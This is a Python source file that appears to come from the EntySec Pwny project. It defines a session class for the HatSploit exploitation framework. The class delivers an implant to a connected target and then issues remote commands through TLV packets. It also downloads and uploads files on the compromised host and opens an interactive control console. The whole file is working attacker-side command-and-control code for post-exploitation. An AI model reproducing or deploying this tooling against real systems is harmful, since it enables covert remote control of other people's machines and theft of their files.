"""
MIT License

Copyright (c) 2020-2023 EntySec

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

import os
import socket

from typing import Union

from . import Pwny
from .tlv import TLV, TLVPacket
from .console import Console

from hatsploit.lib.loot import Loot
from hatsploit.lib.session import Session

from pex.proto.channel import ChannelClient


class PwnySession(Pwny, Session, Console, TLV):
    """ Subclass of pwny module.

    This subclass of pwny module represents an implementation
    of the Pwny session for HatSploit Framework.
    """

    def __init__(self) -> None:
        super().__init__()

        self.loot = Loot()

        self.pwny = f'{os.path.dirname(os.path.dirname(__file__))}/pwny/'

        self.pwny_data = self.pwny + 'data/'
        self.pwny_libs = self.pwny + 'libs/'

        self.pwny_plugins = self.pwny + 'plugins/'
        self.pwny_commands = self.pwny + 'commands/'

        self.channel = None
        self.uuid = None

        self.details.update({
            'Type': "pwny"
        })

    def open(self, client: socket.socket) -> None:
        """ Open the Pwny session.

        :param socket.socket client: client to open session with
        :return None: None
        :raises RuntimeError: with trailing error message
        """

        client.send(self.get_implant(
            platform=self.details['Platform'],
            arch=self.details['Arch']
        ))

        self.channel = ChannelClient(client)
        self.uuid = self.tlv_read_packet(self.channel).data

        if self.uuid:
            self.start_pwny(self)
            return

        raise RuntimeError("No UUID received or UUID broken!")

    def close(self) -> None:
        """ Close the Pwny session.

        :return None: None
        """

        self.channel.disconnect()

    def heartbeat(self) -> bool:
        """ Check the Pwny session heartbeat.

        :return bool: True if the Pwny session is alive
        """

        return not self.channel.terminated

    def send_command(self, command: str, output: bool = False,
                     args: list = [], pool: dict = {}, messages: bool = False) -> str:
        """ Send command to the Pwny session.

        :param str command: command to send
        :param bool output: wait for the output or not
        :param Union[dict, str] args: command arguments
        :param dict pool: pool
        :param bool messages: receive messages in loop
        :return str: command output
        """

        if not pool:
            pool = self.tlv_api_calls

        for s in pool:
            if command in pool[s]:
                tag = pool[s][command]

                self.tlv_send_packet(self.channel, TLVPacket(
                    pool=s,
                    tag=tag,
                    status=self.tlv_success,
                    size=0,
                    data=b""
                ))

                for arg in args:
                    data = arg if isinstance(arg, bytes) else arg.encode()

                    self.tlv_send_packet(self.channel, TLVPacket(
                        pool=s,
                        tag=tag,
                        status=self.tlv_success,
                        size=len(data),
                        data=data
                    ))

                if not messages:
                    result = self.tlv_read_packet(self.channel)
                    self.tlv_process_error(result)

                    if output:
                        return result.data.decode()
                    return ''

                self.tlv_read_messages(self.channel)

        return ''

    def download(self, remote_file: str, local_path: str) -> bool:
        """ Download file from the Pwny session.

        :param str remote_file: file to download
        :param str local_path: path to save downloaded file to
        :return bool: True if download succeed
        """

        return self.tlv_read_file(self.channel, remote_file, local_path)

    def upload(self, local_file: str, remote_path: str) -> bool:
        """ Upload file to the Pwny session.

        :param str local_file: file to upload
        :param str remote_path: path to save uploaded file to
        :return bool: True if upload succeed
        """

        return self.tlv_send_file(self.channel, local_file, remote_path)

    def interact(self) -> None:
        """ Interact with the Pwny session.

        :return None: None
        """

        self.pwny_console(self)
